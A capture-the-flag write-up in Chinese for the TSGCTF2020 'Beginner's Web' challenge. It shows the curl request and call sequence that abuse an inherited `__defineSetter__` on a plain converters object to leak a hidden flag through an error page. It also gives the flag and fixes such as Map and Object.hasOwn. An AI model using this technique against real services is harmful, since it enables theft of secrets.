# TSGCTF2020 Beginner's Web WP

## 题目简述

应用提供 Base64 和 scrypt 两种转换器，并在全局对象 `converters` 中按会话注册一个隐藏转换器：

```javascript
converters.base64 = base64Converter;
converters.scrypt = scryptConverter;
converters[`FLAG_${request.session.sessionId}`] = flagConverter;
```

用户提交的 `converter` 若含大写字符 `F`、`L`、`A`、`G` 中任意一个就会被拒绝，因此无法直接指定隐藏键。然而代码用普通对象保存转换器，也没有验证查到的值是否为自有函数，导致 `Object.prototype` 上的 `__defineSetter__` 可被当作转换器调用。

## 解题过程

先从目标浏览器页面记下 Session ID。另开一个请求，令 `converter=__defineSetter__`，并把 `input` 设为该浏览器对应的隐藏键：

```bash
curl -X POST 'http://target/' \
  --data-urlencode 'converter=__defineSetter__' \
  --data-urlencode 'input=FLAG_<浏览器显示的Session ID>'
```

这里 `__defineSetter__` 不含过滤的四个大写字符，而输入长度也超过 20。实际调用等价于：

```javascript
converters.__defineSetter__(
  `FLAG_${victimSessionId}`,
  (error, result) => { /* 当前请求 Promise 的回调 */ }
);
```

它在全局 `converters` 上为目标会话键安装 setter，并把当前 Promise 的回调函数作为 setter。`__defineSetter__` 本身不会调用回调，所以这个 HTTP 请求会暂时挂起。

随后尽快在原浏览器中正常提交一次 Base64 或 scrypt 转换。服务处理该会话时会再次执行：

```javascript
converters[`FLAG_${victimSessionId}`] = flagConverter;
```

该赋值不再保存函数，而是触发刚安装的 setter，并把 `flagConverter` 作为唯一实参传给回调。回调把这个函数对象当作 `error`，于是挂起请求进入错误处理器：

```javascript
app.setErrorHandler((error, request, reply) => {
  reply.view('index.html', {error, sessionId: request.session.sessionId});
});
```

Nunjucks 渲染 `{{error}}` 时会把函数转为源码字符串；`flagConverter` 函数体内硬编码的 flag 随之出现在错误页面。官方结果为：

```text
TSGCTF{Goo00o0o000o000ood_job!_you_are_rEADy_7o_do_m0re_Web}
```

## 方法总结

本题属于原型链上的继承属性误用，而不是绕过正则后直接猜键。普通对象天然继承 `__defineSetter__`，动态索引调用把它变成了安装 setter 的原语；后续对秘密键的赋值又把包含 flag 的函数对象送入攻击者控制的回调，错误模板最终泄漏函数源码。动态分发表应使用 `Object.create(null)` 或 `Map`，并用 `Object.hasOwn` 验证键；更不能把秘密直接嵌在可能被序列化、报错或字符串化的函数体中。
